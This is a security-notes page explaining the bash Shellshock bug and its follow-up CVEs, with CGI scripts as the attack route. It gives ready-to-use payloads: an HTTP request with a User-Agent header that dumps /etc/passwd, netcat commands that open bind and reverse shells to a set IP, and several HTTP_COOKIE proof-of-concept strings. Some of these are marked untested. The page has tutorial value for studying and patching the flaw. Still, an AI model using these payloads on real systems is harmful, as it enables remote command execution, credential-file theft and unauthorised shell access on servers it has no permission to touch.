# CGIs

When you call a CGI, the web server (e.g Apache) starts a new process, typically a bash shell, and runs the CGI script.

Apache needs to pass information to the CGI script. It does so using environment variables, for example every HTTP header (amongst other information) is passed to the CGI. E.g. a HTTP header named HELLO in your request, you will bee available as an environment variable named HTTP_HELLO in the CGI script.

## Shellshock

Bash supports exporting not just shell variables, but also shell functions to other bash instances, via the process environment to (indirect) child processes.   An environment variable starting with `() {` in the variable value, allows on to propagate function
definitions through the environment.  

[CVE-2014-6271 ](https://seclists.org/oss-sec/2014/q3/650) [[patch](http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-027)] aka Shellshock occured because bash did not stop after processing the function definition; it continued to parse and execute shell commands following the function definition.  

For example, an environment variable setting of `VAR=() { ignored; }; /bin/id` will execute `/bin/id` when the environment is imported into the bash process. (The process is in a slightly undefined state at this point. The `PATH` variable may not have been set up yet, and bash could crash after executing `/bin/id`, but the damage has already happened at this point.)

The fact that an environment variable with an arbitrary name can be used as a carrier for a malicious function definition containing trailing commands makes this vulnerability particularly severe; it enables network-based exploitation.  HTTP requests to CGI scripts have been identified as a major attack vector.

For example, you can override existing headers or add new malicious headers as follows.  This version attempts to terminate the HTTP response and write malicious content to it.

```http
GET /cgi-bin/status HTTP/1.1
Host: ptl-6d5e0ee9-04c5fb39.libcurl.so
User-Agent: () {:;}; echo $(cat /etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"
```

Alternatively, you may want to try to establish a bind or reverse shell, for example with netcat:

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```
```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```

Many similar vulnerabilities in the same subpart of Bash have been found since, due to incomplete/inadequate fixes, including [[ref](https://lcamtuf.blogspot.com/2014/09/bash-bug-apply-unofficial-patch-now.html) and [ref](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html)]

[CVE-2014-7169](https://www.thegeekstuff.com/2014/09/bash-shellshock-fix-cve-2014-7169/) [[patch](http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-026)] allow a slightly different syntax that still allows this to be exploited.  

You can convince the parser to keep looking for a file name for output redirection `>` past the boundary between the untrusted string accepted from the environment and the actual body of the program that bash is being asked to execute [[ref](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html)].

NOTE: Untested:

```bash
HTTP_COOKIE='() { (a)=>\' bash -c "echo date"; cat /tmp/echo
```
```bash
HTTP_COOKIE='() { function a a>\' bash -c echo
```

[CVE-2014-7186](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html) seemed to be a non-exploitable crash, trying to dereference a non-attacker-controlled pointer at an address that "by design" should fall well above the end of heap. 

The test for this problem was pretty simple - you just needed a sequence of here-documents that overflowed a static array, say:

```bash
HTTP_COOKIE='() { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; }' bash -c :
```

[CVE-2014-7187](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html) involved an off-by-one issue with loop parsing. 

The proof-of-concept function definition for this is a trivial `for` loop nested 129 levels deep, but the effect can be only observed under memory access diagnostics tools, and its practical significance is probably low.

[CVE-2014-6277](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html) proved to be a very straightforward use of uninitialized memory: it hit a code path in `make_redirect()` where one field in a newly-allocated `REDIR` struct - `here_doc_eof` - would not be set to any specific value, yet would be treated as a valid pointer later on (somewhere in `copy_redirect()`).

```bash
HTTP_COOKIE='() { x() { _; }; x() { _; } <<a; }' bash -c :
```

On a good majority of Linux distros, the `--enable-bash-malloc` and `--enable-mem-scramble` flags are disabled, and you can trivially get bash to dereference a pointer that is entirely within attacker's control:

```bash
HTTP_COOKIE="() { x() { _; }; x() { _; } <<`perl -e '{print "A"x1000}'`; }" bash -c :
```

[CVE-2014-6278](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html) is _magic_?  A sequence of nested $... statements within a redirect appears to cause the parser to bail out without properly resetting its state, and puts it in the mood for executing whatever comes next.


```bash
HTTP_COOKIE='() { _; } >_[$($())] { echo hi mom; id; }' bash -c :
```